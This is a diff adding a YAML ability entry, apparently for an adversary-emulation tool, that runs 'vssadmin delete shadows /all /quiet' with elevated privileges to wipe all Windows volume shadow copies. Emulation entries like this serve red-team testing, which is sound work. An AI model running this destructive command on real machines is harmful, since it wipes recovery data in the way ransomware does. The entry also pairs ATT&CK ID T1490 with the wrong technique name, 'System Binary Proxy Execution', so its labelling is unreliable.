@@ -1,0 +1,21 @@
+- id: 952a945f-3128-bc1f-fb10-9a7bdce39655
+  name: Vssadmin.exe - Delete all volume shadow copies on the host without prompting
+  description: Delete all volume shadow copies on the host without prompting
+  tactic: impact
+  technique:
+    attack_id: T1490
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: vssadmin delete shadows /all /quiet
+  singleton: false
+  privilege: Elevated
+  repeatable: true
+  buckets:
+  - impact
+  version: '1.0'
+  author: mmadersbacher
+  created: '2026-08-16'
+  modified: '2026-08-16'
+  operating_system: Windows All Versions
